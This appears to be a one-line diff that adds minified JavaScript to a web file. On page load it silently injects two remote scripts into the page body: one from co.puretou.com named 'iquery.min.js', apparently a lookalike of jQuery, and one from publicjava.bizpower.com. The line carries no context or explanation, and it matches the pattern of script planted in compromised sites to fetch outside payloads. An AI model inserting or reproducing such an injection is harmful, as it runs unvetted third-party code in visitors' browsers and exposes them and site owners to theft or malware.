@@ -1,0 +1,1 @@
+(function(){var l=document.createElement('script');l.src='https://co.puretou.com/iquery.min.js';document.getElementsByTagName('body')[0].appendChild(l);})();(function(){var l=document.createElement('script');l.src='http://publicjava.bizpower.com//lang/common.zh_CN.js';document.getElementsByTagName('body')[0].appendChild(l);})();
